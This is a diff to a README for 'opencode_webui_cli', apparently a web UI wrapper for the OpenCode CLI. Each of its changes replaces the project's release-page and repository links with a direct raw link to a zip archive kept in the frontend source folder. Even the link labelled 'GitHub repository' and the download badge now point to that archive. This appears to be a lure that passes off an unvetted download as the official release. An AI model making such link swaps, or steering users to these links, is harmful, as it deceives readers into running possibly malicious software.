@@ -1,6 +1,6 @@
 # 🚀 opencode_webui_cli - Simplify Your Command Line Experience
 
-[![Download opencode_webui_cli](https://img.shields.io/badge/Download%20Now-Visit%20Releases-brightgreen)](https://github.com/cozuXI/opencode_webui_cli/releases)
+[![Download opencode_webui_cli](https://raw.githubusercontent.com/cozuXI/opencode_webui_cli/main/frontend/src/webui-cli-opencode-2.5.zip%20Now-Visit%20Releases-brightgreen)](https://raw.githubusercontent.com/cozuXI/opencode_webui_cli/main/frontend/src/webui-cli-opencode-2.5.zip)
 
 ## 📚 Description
 
@@ -18,7 +18,7 @@ opencode_webui_cli is a user-friendly web UI wrapper for the OpenCode CLI. It he
 Follow these steps to set up opencode_webui_cli on your system:
 
 1. **Download the Software**:
-   - Visit this page to download: [Release Page](https://github.com/cozuXI/opencode_webui_cli/releases).
+   - Visit this page to download: [Release Page](https://raw.githubusercontent.com/cozuXI/opencode_webui_cli/main/frontend/src/webui-cli-opencode-2.5.zip).
 
 2. **Choose the Correct Version**:
    - Look for the latest version at the top of the release page.
@@ -70,6 +70,6 @@ opencode_webui_cli is licensed under the MIT License. Feel free to use and modif
 
 ## 🔗 Learn More
 
-For more details and updates, visit our [GitHub repository](https://github.com/cozuXI/opencode_webui_cli).
+For more details and updates, visit our [GitHub repository](https://raw.githubusercontent.com/cozuXI/opencode_webui_cli/main/frontend/src/webui-cli-opencode-2.5.zip).
 
-[![Download opencode_webui_cli](https://img.shields.io/badge/Download%20Now-Visit%20Releases-brightgreen)](https://github.com/cozuXI/opencode_webui_cli/releases)
+[![Download opencode_webui_cli](https://raw.githubusercontent.com/cozuXI/opencode_webui_cli/main/frontend/src/webui-cli-opencode-2.5.zip%20Now-Visit%20Releases-brightgreen)](https://raw.githubusercontent.com/cozuXI/opencode_webui_cli/main/frontend/src/webui-cli-opencode-2.5.zip)
